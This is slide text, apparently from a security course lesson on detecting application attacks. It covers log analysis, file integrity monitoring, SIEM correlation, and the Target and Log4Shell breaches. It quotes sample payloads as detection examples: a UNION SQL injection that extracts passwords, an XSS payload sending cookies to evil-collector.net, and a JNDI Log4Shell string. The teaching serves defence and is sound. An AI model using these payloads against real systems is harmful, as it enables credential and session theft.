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5.6: Detecting Attacks on Data and Applications. Noticing that an attack has happened. Hash verification and file integrity monitoring, log analysis for the signatures of application attacks, data loss prevention, and the harder question of whether a given detection method is worth what it costs.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5.6. Open with this analogy before the mechanics: "An application log is a security camera pointed at the cash register, not the front door. It won't stop a theft by itself — but it is often the only record of exactly how, and exactly when, one happened."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Perimeter defenses, firewalls, network segmentation, access control lists, are designed to keep adversaries out. But every mature security program operates on the assumption that prevention will eventually fail: a zero-day will be weaponized, a credential will be phished, a misconfigured API will be exposed. Application threat auditing is the academic and operational discipline built around that assumption. Rather than asking 'how do we stop the attacker,' it asks 'how do we prove, from the evidence an application leaves behind, that an attacker was here, and what did they touch?'</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This discipline sits at the intersection of three evidentiary sources: application/web server logs (the literal strings attackers send), file integrity monitoring (proof of what changed on disk), and anomaly detection (statistical deviation from a behavioral baseline). Each covers a blind spot the other two share.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conflate a Web Application Firewall (WAF) blocking a request with 'detection.' They are related but distinct disciplines. Prevention stops a known-bad pattern before it executes. Auditing assumes prevention already failed somewhere, maybe the WAF rule didn't cover this payload variant, maybe the attacker used a zero-day, maybe it was an authorized insider abusing legitimate access that no firewall rule would ever block.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Auditing is the forensic and monitoring layer that exists precisely because you cannot prevent everything. This distinction is one of the most heavily tested framing ideas in this topic.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theoretical backbone of log-based detection is signature-based detection contrasted against behavioral baselining. A SQL injection attempt containing ' OR '1'='1 can be caught by a signature the moment it appears in a log line. A compromised service account slowly exfiltrating one megabyte of customer data per night, staying under any single alert threshold, will never trip a signature, it can only be caught by comparing this week's behavior to months of established baseline.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A mature Security Operations Center (SOC) runs both approaches in parallel, because each covers the other's blind spot. This pairing is the conceptual foundation for everything else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Centralizing evidentiary streams is not optional at scale. This is the motivating problem behind log aggregation and the rise of the Security Information and Event Management (SIEM) platform as the field's central tool. A SIEM's value is not merely storage, it is correlation: joining a suspicious log line on one server with a file hash mismatch on another and a behavioral outlier on a third, at the same timestamp, to reconstruct the narrative of an attack that no single data source could tell alone.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Gartner coined 'SIEM' in 2005, merging Security Information Management (SIM) and Security Event Management (SEM). Modern examples include Splunk Enterprise Security, Microsoft Sentinel, and Elastic Security.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 established the conceptual foundation: application threat auditing is the discipline that assumes prevention has already failed and asks what evidence proves it. Its two core detection philosophies, signature-based matching and behavioral baselining, are complementary, and both feed into a centralized SIEM operated by a SOC. This vocabulary underlies every mechanism covered in Section II.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request to an Apache or Nginx web server is written to an access log before the application logic even executes. Because the raw request string is preserved verbatim, injection payloads, which must be syntactically valid within the request, appear as recognizable, often ungrammatical fragments inside the URL or query string.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This makes the access log the single richest and earliest evidentiary source for detecting exploitation attempts, since it captures the attacker's literal input before any downstream processing, filtering, or blocking occurs.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signals in a single log line justify immediate escalation. The User-Agent string identifies sqlmap , an automated SQL injection exploitation tool, a legitimate browser would never send this. The URL-decoded query string reveals a classic UNION-based injection appending UNION SELECT username,password,3 FROM users-- to pull credentials out of a table the application was never meant to expose through this endpoint.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The trailing double-dash is a SQL comment terminator used to silently discard the rest of the application's original query so the injected clause parses without a syntax error. Notably, the server responded with 200, meaning the request was processed rather than rejected, which is precisely why log-based detection matters even in environments with a WAF: a novel payload variant can slip past filtering rules and only the log record proves it happened.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reflected XSS probe looks structurally different from SQLi but follows the same principle of leaving a literal, syntactically telling fragment in the request line. Decoded, the q parameter contains &lt;script&gt;document.location='https://evil-collector.net/c?c='+document.cookie&lt;/script&gt; , a classic session cookie theft payload that redirects the victim's browser to an attacker server, appending their session cookie as a query parameter.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The tool signature XSStrike in the User-Agent is another automated-scanner giveaway, exactly parallel to sqlmap's signature in the SQLi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Analysts rarely wait for a SIEM correlation rule to fire; ad-hoc command-line hunting across raw logs remains a core, exam-relevant skill. The demo below reproduces a basic sweep for common injection indicators across a rotated log directory, then tallies offending source IPs, then, most importantly, filters specifically for requests that both contain an injection indicator and returned a successful status code rather than a WAF block.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This final pattern is the highest-value hunting technique in the chapter: a blocked attempt is a policy success story; a successful request containing an injection signature is the one that demands immediate incident response.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log analysis catches the attempt, FIM catches the consequence. The mechanism is conceptually simple: compute a cryptographic hash of every file that matters, binaries, configuration files, web application source, while the system is in a known-good state, store those hashes as a trusted baseline, and periodically recompute the hashes to detect drift. Any mismatch means the file changed, and if no authorized change ticket explains it, that mismatch is evidence of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A cryptographic hash function is a one-way function producing a fixed-length fingerprint such that any change to the input, even a single bit, produces a completely different output, and the original input cannot practically be recovered from the hash.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hand-rolled sha256sum baseline is instructive but does not scale to enterprise use, which is why purpose-built FIM tools exist. Establishing a baseline is straightforward: compute SHA-256 hashes for every file in the web root and store them. Verification later re-runs the hash and flags any FAILED comparison.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The example output below shows a compromised host: a PHP file appearing inside an uploads/ directory, a directory that should only ever contain images, is a textbook web shell indicator that FIM would catch even if no log signature existed for the upload technique used.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Tripwire, still in commercial and open-source use, pioneered the model of a policy file defining watched paths and a cryptographically signed database preventing an attacker who gains root from simply editing the baseline to hide their tracks. AIDE (Advanced Intrusion Detection Environment) is the dominant free alternative on Linux systems: a configuration file defines monitored directories and which attributes to hash, and aide --check reports deviations from the stored database.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Modern SOCs increasingly fold FIM into a broader endpoint telemetry platform such as osquery, which represents OS state as SQL-queryable virtual tables, letting analysts hunt for recent file modifications interactively rather than waiting on a scheduled AIDE run.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layer builds a statistical model of 'normal' and alerts on deviation. A SIEM correlation rule might combine a threshold-based baseline with contextual enrichment such as GeoIP lookups and known threat-intelligence IP reputation feeds. The example rule below fires only when an unusual upload-directory request is immediately followed by FIM detecting a new file in that same directory, a pattern log analysis or FIM alone would each report as low-confidence noise, but which together constitute near-certain evidence of a web shell upload.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covered the three technical mechanisms underlying application threat auditing: reading raw log evidence for injection signatures, establishing and verifying file integrity baselines, and writing SIEM correlation rules that join log and FIM signals into high-confidence alerts. Every case study in Section III maps back to a success or failure of one or more of these mechanisms.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November-December 2013, attackers who had gained a foothold via a compromised HVAC vendor's credentials moved laterally into Target's point-of-sale network and installed memory-scraping malware on thousands of registers, ultimately exfiltrating roughly 40 million payment card records. Memory-scraping malware reads plaintext payment card data directly from a point-of-sale terminal's volatile memory during the brief window between card swipe and encryption, bypassing encryption-at-rest and in-transit controls entirely.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Target had deployed FireEye exactly for this scenario, and, critically, the tool worked as designed.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alerts were reviewed by a monitoring team and escalated to Target's security staff. No action was taken until after card issuers and the U.S. Department of Justice separately notified Target that a breach was underway. This case is the canonical counterexample to the assumption that detection tooling alone constitutes a defense program. The technical layer performed its function; the organizational process for triaging, prioritizing, and acting on alerts failed.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>It illustrates why application threat auditing must be understood as a full lifecycle, detection, triage, escalation, and response, not merely a technology deployment. This maps directly onto the NIST SP 800-61 Rev. 2 incident handling lifecycle: Preparation, Detection &amp; Analysis, Containment/Eradication/Recovery, Post-Incident Activity.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favorite AP exam trap. A question may describe a company with excellent detection tooling and still ask 'was this organization secure?' The correct analytical move is to separate the technical control from the operational process around it. A SIEM, a FIM tool, or an IDS generating an alert satisfies only the detection stage. If no analyst reviews it, if the alert is buried under thousands of low-fidelity false positives, or if the escalation path lacks authority to act, the organization has not achieved detection in any meaningful sense, it has purchased an expensive log.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December 9, 2021, a critical remote code execution vulnerability was disclosed in Log4j. Tracked as CVE-2021-44228 and nicknamed 'Log4Shell,' the flaw exploited Log4j's JNDI (Java Naming and Directory Interface) message-lookup substitution feature: if an application logged any attacker-influenced string containing ${jndi:ldap://attacker-server/a} , Log4j would resolve and execute the payload, no further interaction required.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Because the vulnerable code path had existed since 2013 and Log4j is embedded transitively, often several dependency layers deep, in an enormous share of enterprise Java applications, the exploitable install base was massive and difficult to fully inventory.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made Log4Shell distinct from most zero-days is that log analysis became simultaneously the exploitation surface and the primary detection mechanism. The very act of an application writing an HTTP header to a log file was what triggered exploitation, and that same act left the exact JNDI lookup string sitting in the access log for any defender who thought to search for it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Organizations that retained months of centralized, searchable log history were able to retroactively determine, within hours, whether they had been probed or actually compromised before the public disclosure, a capability entirely dependent on log aggregation and retention practices established long before the incident.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Within hours of disclosure, security teams worldwide were running near-identical hunts across historical log archives. The regex below matches the core JNDI lookup pattern along with common obfuscation variants attackers used specifically to evade naive WAF regexes that only matched the literal string 'jndi'. Note the requirement to search not just the URL/query string but also extended header fields, and to search compressed, rotated historical archives via zgrep, since the entire point of this hunt was determining exposure from before the public disclosure.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III grounded the chapter's abstract mechanisms in two real incidents. Target showed that even perfect technical detection fails without an organizational process to act on it. Log4Shell showed the unusual case where logging itself was both the vulnerability's trigger and its own best forensic record, but only for organizations with sufficient retention. Both cases reinforce the same underlying thesis: tools alone are not a defense program.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Logs must be shipped off the originating host to a centralized, write-once store the moment they are generated. This defends against the common post-compromise step of an attacker deleting local log evidence, and, as Log4Shell demonstrated, retention windows must be long enough to support retroactive hunting for vulnerabilities disclosed long after the relevant traffic occurred. NIST SP 800-92 recommends log management policy explicitly define retention periods by log source criticality rather than applying a single blanket duration.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detection mechanism should be treated as sufficient. Signature-based WAF and log-pattern rules catch known payloads instantly but miss novel variants; FIM catches successful file-level compromise regardless of the entry vector but only after the fact; behavioral baselining catches the slow, low-and-slow attacker that stays under any single static threshold. Mature programs deploy all three and correlate their outputs in a SIEM, exactly as illustrated in the FIM-plus-log correlation rule in Section II.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case study demonstrates that alert volume without triage capacity is a liability, not a defense. Programs must actively tune detection rules to reduce false positives and must define, in writing, exactly which severity levels trigger which escalation actions and within what time window, closing the exact organizational gap that let Target's FireEye alerts go unactioned.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A false positive is an alert that fires on benign activity, incorrectly flagged as malicious. A high false-positive rate causes analyst fatigue, leading real alerts to be dismissed or delayed, the operational failure mode implicated in the Target breach.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FIM baselines must be re-certified through an authorized change management process whenever a legitimate deployment modifies monitored files, or the control becomes so noisy from expected changes that analysts learn to ignore its alerts entirely, recreating the exact alert-fatigue failure mode described above, applied specifically to file integrity rather than network detection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>If you studied defense-in-depth layering in earlier units, application threat auditing is the concrete instantiation of the 'detect' layer sitting alongside 'prevent' and 'respond.' No individual control discussed in this chapter is sufficient alone.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 translated the chapter's case-study lessons into four concrete hardening controls: immutable centralized retention, layered detection mechanisms, tuned alerting with enforced escalation, and disciplined baseline re-certification. Together they form a program-level answer to both failure modes examined in Section III, Target's process breakdown and Log4Shell's retention dependency.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 frequently gives a scenario and asks which control would have detected it. Use this decision rule: if the scenario describes a recognizable malicious string in a request, the answer is log/signature analysis. If it describes a file on disk that changed, was added, or was modified without a change ticket, the answer is FIM. If it describes a volume, timing, or geographic pattern that is unusual for a specific user or system but contains no obviously malicious string or file change, the answer is anomaly detection/behavioral baselining. Many scenarios require you to name more than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log line indicates an attempted UNION-based SQL injection attack, evidenced by SQL keywords, a comment terminator, and an automated-tool User-Agent. The HTTP 200 status is significant because it indicates the request was processed rather than rejected, elevating this from a blocked attempt to a potential successful exploitation requiring urgent investigation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A complete analyst response correlates against: application-layer database audit logs (did the query actually execute and what was returned?), FIM alerts on the web app directory in the surrounding window (was a web shell dropped as a follow-on?), subsequent activity from the same source IP (did the attacker escalate toward exfiltration?), and SIEM correlation rules tying this event to other indicators.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Signature-based log analysis excels at rapidly catching documented, previously-seen attack patterns, but is blind to novel payloads and to attacks involving no malicious string at all, such as authorized-insider abuse. FIM excels at catching the downstream consequence of a successful compromise regardless of exploitation technique, but would miss a pure data-exfiltration attack that reads data without modifying any monitored file, and only detects compromise after the file-level damage has occurred. Behavioral anomaly detection excels at catching slow, low-and-slow attacks and legitimate-credential misuse, but requires a mature, well-tuned baseline to avoid excess noise.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Because each control's blind spot is a different control's strength, a mature auditing program deploys and correlates all three within a SIEM rather than relying on any single approach.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application exercise asks students to reconstruct a plausible attack timeline using the tools introduced across the chapter: an access log line showing an unusual PHP upload-directory request with status 200, an AIDE alert reporting a new file added to that same directory minutes later, and a SIEM correlation rule that fires because both conditions were met within its 10-minute window. Ordering these correctly, request first, file-drop second, correlated alert third, and explaining why the correlated alert is the actionable trigger (rather than either raw signal alone) is the core reconstruction skill a SOC analyst performs daily.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Pulling every mechanism in this chapter together: an attacker's attempt leaves a literal fingerprint in access logs (Section II); if the attempt succeeds, the consequence leaves a fingerprint in file state, caught by FIM against a trusted baseline; if an attacker evades both by using no recognizable string and touching no monitored file, only behavioral deviation from an established baseline remains as a signal. A SIEM correlates these signals across sources and time to distinguish real incidents from isolated noise (Section II's FIM-plus-log rule).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>But, as the Target case study proves, none of this technical chain matters unless the full detection-to-response lifecycle completes: detection, triage, escalation, and response. A break at any link, as Log4Shell's retention dependency and Target's escalation failure both separately demonstrate, renders the earlier, correctly-functioning links worthless in terms of actual defensive outcome.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on, verify fluency across this checklist. Topic 5.6 is tested less through rote definitions and more through applied scenario analysis, the exam will describe a log line, a file event, or an organizational failure and ask you to diagnose it using the frameworks built across this chapter. If any checklist item feels shaky, revisit the corresponding section: prevention/detection framing (Section I), technical mechanisms (Section II), the Target/Log4Shell case studies (Section III), or the hardening controls (Section IV).</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5: SECURING APPLICATIONS AND DATA</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5.6: Application Threat Auditing</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Noticing that an attack has happened. Hash verification and file integrity monitoring, log analysis for the signatures of application attacks, data loss prevention, and the harder question of whether a given detection method is worth what it costs.</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5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174422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5.6.A</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1874520" y="160020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Explain how attacks against data are detected.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="260032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274434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5.6.B</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1874520" y="260032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Determine which controls will detect attacks directed at an application or its data.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="360044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374446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5.6.C</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1874520" y="360044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Evaluate what a given detection method actually delivers, against what it costs to run.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="460056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ounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="474458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5.6.D</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1874520" y="460056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Determine whether a file has been altered by verifying its hash against a trusted reference value.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="560068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7" name="Rounded Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="574470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5.6.E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1874520" y="560068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Apply detection techniques to log files in order to identify and report indicators of an application attack.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>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An application log is a security camera pointed at the cash register, not the front door. It won't stop a theft by itself — but it is often the only record of exactly how, and exactly when, one happened.</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Prevention Will Fail: The Premise of Auditing</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Prevention Will Fail: The Premise of Auditing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premise:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Every mature security program assumes prevention eventually fails, a zero-day, a phished credential, a misconfigured API</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Application threat auditing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Continuously reviewing application-layer evidence (logs, file states, behavioral baselines) to detect exploitation already occurred or in progress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question it answers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Not 'how do we stop the attacker' but 'did something get through, and what did it do?'</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Framework home:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> NIST SP 800-92 (log management); underpins the Detect function (DE.CM) of the NIST Cybersecurity Framework</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Three evidentiary sources:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Logs, file integrity monitoring, and anomaly detection, each catches something the others miss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Detection Is a Different Job Than Prevention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Prevention:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Stops a known-bad pattern before it executes (e.g., a WAF blocking a payload)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Detection/auditing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Assumes prevention already failed somewhere, a WAF rule missed a variant, a zero-day was used, an insider abused legitimate access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student error:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Conflating 'the WAF blocked it' with 'we have detection'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 matters for the exam:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A firewall rule cannot substitute for log review, FIM, or behavioral baselining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Mental model check:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> If your answer to 'why are we secure' is only a list of prevention tools, you are missing half the picture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Signature-Based Detection vs. Behavioral Baselining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Signature-based detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Matches observed data against known-malicious patterns, fast, low false-positive, but blind to novel attacks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Behavioral baselining:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Statistical model of 'normal' (request volume, geography, access patterns) so deviations become measurable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Worked contrast:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A SQLi string </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>' OR '1'='1</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> is caught instantly by signature; a slow nightly exfiltration under any alert threshold is only caught by baseline comparison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Theoretical root:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Behavioral baselining is grounded in statistical process control (Shewhart, 1931)</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Mature SOC design:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Runs both approaches in parallel because each covers the other's blind spot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SOC, Log Aggregation, and the SIEM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 problem:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A single server can generate tens of thousands of log lines/hour; enterprises generate volumes no human can review manually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Log aggregation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Collecting logs from distributed sources into one centralized, normalized, searchable store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SIEM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Security Information and Event Management platform, ingests, normalizes, and correlates logs from across the org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Correlation is the value-add:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Not just storage, joining a suspicious log line, a file hash mismatch, and a behavioral outlier at the same timestamp</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SOC structure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Tiered team (Tier 1 triage, Tier 2 investigation, Tier 3 threat hunting) executing the NIST SP 800-61 incident lifecycle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5.6.1.a.5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Application threat auditing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Reviewing app-layer evidence to detect exploitation that already occurred or is in progress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Signature-based detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Matching against known-malicious patterns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Behavioral baselining:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Statistical model of normal, alerting on deviation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Log aggregation / SIEM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Centralized collection and cross-source correlation of evidence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SOC:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The tiered team executing detection, triage, escalation, and response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Access Logs: The Literal Fingerprint of an Attack</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Access Logs: The Literal Fingerprint of an Attack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Access log:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Records every HTTP request served, client IP, timestamp, request line, status code, response size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Formats:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Common Log Format (CLF) and extended Combined Log Format (adds referrer/user-agent)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Default paths:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> /var/log/apache2/access.log, /var/log/nginx/access.log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insight:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Because the raw request string is preserved verbatim, injection payloads leave a textual fingerprint before the app even finishes processing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 precedes app logic:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The web server writes the log entry regardless of whether the app-layer code ultimately rejects the request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 Real SQL Injection Log Line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A GET request to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>products.php?id=...UNION SELECT username,password,3 FROM users--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1, User-Agent:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>sqlmap/1.7.2</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
